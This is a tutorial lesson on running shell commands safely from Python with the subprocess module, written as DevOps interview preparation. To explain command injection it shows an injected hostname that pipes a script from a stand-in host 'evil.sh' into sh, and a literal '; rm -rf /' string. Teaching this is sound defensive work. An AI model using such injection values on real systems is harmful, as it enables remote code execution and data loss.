# Day 15 — Python for Automation I: Subprocess & Shell Execution

**Phase:** 0 – Foundation | **Week:** W3 | **Domain:** Python DevOps | **Flag:** —

## Brief

Every automation tool you'll build eventually needs to shell out — run `df`, call `ssh`, invoke `terraform`, drive `kubectl`. How you do that is one of the sharpest lines between someone who scripts and someone who *engineers* automation: get it wrong and you've built a shell-injection vulnerability, a silently-hanging CI job, or a script that "works on my machine" because it depends on the interactive shell's `PATH`. This is also one of the most commonly asked practical Python interview questions for DevOps roles — "how do you safely run a shell command from Python" comes up constantly because it tests whether you understand the security and reliability implications, not just the syntax.

This day is split into three focused files:

1. **This file** — the `subprocess` module in depth: `run()`, `Popen`, `check_output`, timeouts, return codes, and the `shell=True` vs `shell=False` distinction and injection risk.
2. **[02-README-Filesystem-And-CLI-Tooling.md](02-README-Filesystem-And-CLI-Tooling.md)** — `os` vs `pathlib`, and building CLIs with `argparse` vs `click`.
3. **[03-README-Logging-And-Environments.md](03-README-Logging-And-Environments.md)** — the `logging` module done properly, virtual environments, and `pyproject.toml`/`ruff`/`mypy`.

## The evolution: `os.system` → `subprocess`

Old code (and too much code still in production) uses `os.system("some command")` or `os.popen(...)`. Both are legacy: `os.system` gives you only the exit code (as an OS-encoded status, not even a clean return code) and dumps stdout/stderr straight to the terminal — you can't capture output, can't set a timeout, and it always goes through the shell, so it inherits every shell-injection risk described below. `subprocess` (stdlib since Python 2.4, the *only* recommended way since 3.5's addition of `run()`) replaces all of `os.system`, `os.spawn*`, `os.popen`, and the `commands` module. If you see `os.system` in a code review, that's a flag to fix, not a style preference.

## `subprocess.run()` — the modern, preferred entry point

```python
import subprocess

result = subprocess.run(
    ["df", "-h", "/"],
    capture_output=True,   # populate result.stdout / result.stderr
    text=True,             # decode bytes -> str using locale encoding (was `universal_newlines` pre-3.7)
    timeout=10,             # seconds; raises TimeoutExpired if exceeded
    check=True,             # raise CalledProcessError on non-zero exit instead of silently returning it
)
print(result.stdout)
print(result.returncode)   # 0 on success
```

`run()` is a synchronous, blocking call that waits for the command to finish and returns a `CompletedProcess` object with `.args`, `.returncode`, `.stdout`, `.stderr`. This is what you want for the vast majority of automation scripts: "run this, wait for it, tell me what happened."

Key parameters worth knowing cold:
- **`capture_output=True`** — shorthand for `stdout=subprocess.PIPE, stderr=subprocess.PIPE` (added in 3.7). Without it, output goes straight to your terminal and `result.stdout` is `None`.
- **`text=True`** (alias `universal_newlines=True`) — decodes stdout/stderr as strings instead of returning raw `bytes`. Omit it and you're stuck calling `.decode()` yourself and dealing with `\r\n` normalization.
- **`timeout=N`** — without this, a hung remote command (a stuck SSH session, a process waiting on stdin) blocks your script *forever*. Always set a timeout on anything that touches a network or another host.
- **`check=True`** — without it, a failing command (non-zero exit) is swallowed silently; you must remember to check `result.returncode` yourself. With it, a `CalledProcessError` is raised, which you can catch and inspect (`exc.returncode`, `exc.stdout`, `exc.stderr`).
- **`stderr=subprocess.STDOUT`** — merges stderr into stdout (one combined stream), useful when you just want "everything the command printed" in order.

## `check_output()` and `check_call()` — older, narrower helpers

```python
output = subprocess.check_output(["git", "rev-parse", "HEAD"], text=True).strip()
subprocess.check_call(["terraform", "apply", "-auto-approve"])
```

These predate `run()` (Python 3.5 unified everything into `run()`). `check_output` returns just stdout as bytes/str and raises `CalledProcessError` on failure — it's effectively `subprocess.run(..., stdout=PIPE, check=True).stdout`. `check_call` runs and raises on failure but returns nothing useful. You'll still see them in older codebases and some style guides prefer `check_output` for "one-liner, I just want the text" cases, but `run()` is strictly more capable (you get returncode, stderr, timeout, etc. in one object) and is what new code should default to.

## `Popen` — when you need control, not just a result

`run()` is built on top of `Popen` and covers the common "run and wait" case. Drop to `Popen` directly when you need:

- **Streaming output line-by-line** while the process runs (e.g., tailing a long-running build), instead of waiting for it to finish and getting a blob at the end.
- **Concurrent processes** — starting several commands and polling/waiting on them without blocking sequentially.
- **Piping between processes** in Python instead of via the shell (`ps aux | grep python` reimplemented safely).
- **Interactive control** — writing to a subprocess's stdin while reading its stdout (e.g., driving an interactive CLI).

```python
proc = subprocess.Popen(
    ["ping", "-c", "4", "example.com"],
    stdout=subprocess.PIPE,
    text=True,
)
for line in proc.stdout:          # stream output as it's produced
    print("got:", line.rstrip())
proc.wait(timeout=15)
if proc.returncode != 0:
    raise RuntimeError(f"ping failed with {proc.returncode}")
```

Piping two Python-managed processes together (the safe equivalent of `cmd1 | cmd2`):

```python
p1 = subprocess.Popen(["ps", "aux"], stdout=subprocess.PIPE)
p2 = subprocess.Popen(["grep", "python"], stdin=p1.stdout, stdout=subprocess.PIPE, text=True)
p1.stdout.close()   # allow p1 to receive SIGPIPE if p2 exits first
output, _ = p2.communicate()
```

`Popen.communicate(input=None, timeout=None)` is the safe way to read all output *and* avoid deadlock — reading `Popen.stdout` and writing `Popen.stdin` directly, without `communicate()`, can deadlock if the OS pipe buffer fills up (typically ~64KB) because the child blocks writing to a full pipe while your parent process is blocked doing something else. `communicate()` uses threads/select internally to avoid exactly that trap. Rule: if you're not streaming, use `communicate()` or just use `run()`.

## `shell=True` vs `shell=False` — the interview-critical distinction

**This is the core safety question in this whole topic:** *"How do you run a shell command from Python safely? What are the risks of `shell=True`?"*

By default (`shell=False`), `subprocess` takes a **list of arguments** and executes the program directly via `exec`-family syscalls — no shell is involved at all:

```python
subprocess.run(["ls", "-la", user_supplied_dir])   # safe: user_supplied_dir is ONE argument, no matter its content
```

Even if `user_supplied_dir` contains `; rm -rf /` as a literal string, it is passed as a single, literal argument to `ls` — there is no shell to interpret `;`, `|`, `&&`, backticks, or `$(...)`. This is the single biggest reason list-form + `shell=False` is the default recommendation.

With `shell=True`, you pass a **single string**, and Python hands it to `/bin/sh -c "<your string>"` for interpretation — meaning every shell metacharacter is live:

```python
# DANGEROUS if hostname comes from user input, an API response, a config file, anything untrusted:
subprocess.run(f"ping -c 1 {hostname}", shell=True)

# hostname = "example.com; curl evil.sh | sh"  ->  runs an attacker's script, full shell injection (CWE-78)
```

This is the textbook **OS command injection** vulnerability. It's not theoretical — it's one of the most common real-world Python security bugs, and it's exactly what a security-conscious interviewer is probing for with this question.

### When `shell=True` is actually needed

Sometimes you genuinely need shell features: pipes, globbing, environment variable expansion, `&&` chaining. If so:

1. **Never interpolate untrusted input into the string.** If any part of the command comes from a user, an API, a file, or config that isn't fully trusted, do not use `shell=True` with string formatting/f-strings.
2. If you must build the string from trusted, fixed parts only, still prefer keeping it out of `shell=True` by using `shlex.split()` to turn a string into a safe argument list:
   ```python
   import shlex
   cmd = shlex.split("rsync -avz src/ dest/")   # -> ['rsync', '-avz', 'src/', 'dest/']
   subprocess.run(cmd)   # shell=False (default) — no shell involved
   ```
3. If you truly need shell features like pipes and can't restructure with `Popen` piping (above), use `shlex.quote()` to escape any variable you must embed:
   ```python
   safe_host = shlex.quote(hostname)
   subprocess.run(f"ping -c 1 {safe_host}", shell=True)   # quoting neutralizes injection, but list-form is still preferred
   ```

**The honest answer an interviewer wants:** default to `shell=False` with a list of arguments — it's immune to shell injection by construction, not by careful escaping. Reach for `shell=True` only for trusted, static commands where you need real shell features (pipes, wildcards), and even then prefer restructuring with `Popen` pipelines or `shlex` over trusting string interpolation.

## Timeouts, return codes, and exception handling

```python
import subprocess

try:
    result = subprocess.run(
        ["ssh", "-o", "ConnectTimeout=5", host, "df", "-h", "/"],
        capture_output=True,
        text=True,
        timeout=10,
        check=True,
    )
except subprocess.TimeoutExpired:
    logger.error("Command to %s timed out", host)
except subprocess.CalledProcessError as exc:
    # exc.returncode, exc.stdout, exc.stderr are all available for diagnostics
    logger.error("Command failed (exit %d): %s", exc.returncode, exc.stderr)
except FileNotFoundError:
    # raised when the executable itself doesn't exist (typo, not in PATH) — NOT a shell "command not found"
    logger.error("ssh binary not found on PATH")
```

Note the last case: with `shell=False`, a missing executable raises Python's own `FileNotFoundError` immediately (no process was ever spawned) — a different failure mode than a command that runs but exits non-zero. With `shell=True`, the shell absorbs a missing command and reports it via a non-zero exit code from `/bin/sh` instead, so you lose that distinction.

**`TimeoutExpired` does not kill the process for you** in older invocations of `Popen` — it kills processes started via `run()` automatically, but if you're driving `Popen` manually with `.communicate(timeout=...)`, catching the timeout still leaves the child process running; you must call `proc.kill()` and then `proc.communicate()` again to reap it.

## Points to Remember

- `subprocess.run()` is the modern default for "run and wait"; `Popen` is for streaming, concurrency, or manual pipe control; `check_output`/`check_call` are older, narrower helpers still fine for quick one-liners.
- Default to `shell=False` and pass a **list** of arguments — this is immune to shell injection because there's no shell parsing the string at all.
- `shell=True` passes your string to `/bin/sh -c` — every metacharacter (`;`, `|`, `&&`, `` ` ``, `$()`) becomes live. Never string-interpolate untrusted input into a `shell=True` command.
- `shlex.split()` turns a shell-style string into a safe argument list without invoking a shell; `shlex.quote()` escapes a single value if you must keep `shell=True`.
- Always set `timeout=` on anything involving the network or another host — an unbounded call can hang your automation forever.
- Use `check=True` (or manually inspect `.returncode`) — a failing command that's silently ignored is a classic source of automation that "succeeds" while doing nothing.
- `capture_output=True, text=True` gives you decoded stdout/stderr as strings on the returned object; without them you get `None` (output goes to the terminal) or raw `bytes`.
- Use `Popen.communicate()`, not manual `.stdout.read()` + `.stdin.write()`, to avoid pipe-buffer deadlocks.

## Common Mistakes

- Using `shell=True` with an f-string built from user/API/config input — the canonical OS command injection bug (CWE-78), and the exact scenario the interview question is testing for.
- Passing a full command as a single string to `run()`/`Popen` *without* `shell=True` — e.g., `subprocess.run("ls -la /tmp")` — which fails because with `shell=False` the entire string is treated as the name of one executable (`"ls -la /tmp"`), not parsed into arguments.
- Forgetting `timeout=`, then having a CI pipeline or cron job hang indefinitely on a stuck SSH connection or a command waiting on stdin it will never receive.
- Not setting `check=True` (or checking `returncode` manually) and treating a failed remote command as if it succeeded — especially dangerous when the failure is "server unreachable" and the script proceeds to log "disk usage: 0%".
- Reading a child process's stdout and writing to its stdin directly (bypassing `communicate()`) and hitting a deadlock once output exceeds the OS pipe buffer (~64KB on Linux).
- Assuming `capture_output=True` is the default — it isn't; omit it and `result.stdout`/`result.stderr` are `None`, output goes straight to your terminal instead of being captured.
- Catching `subprocess.CalledProcessError` but not `FileNotFoundError`, then getting an unhandled traceback in production when a binary isn't installed or isn't on `PATH` on the target machine.
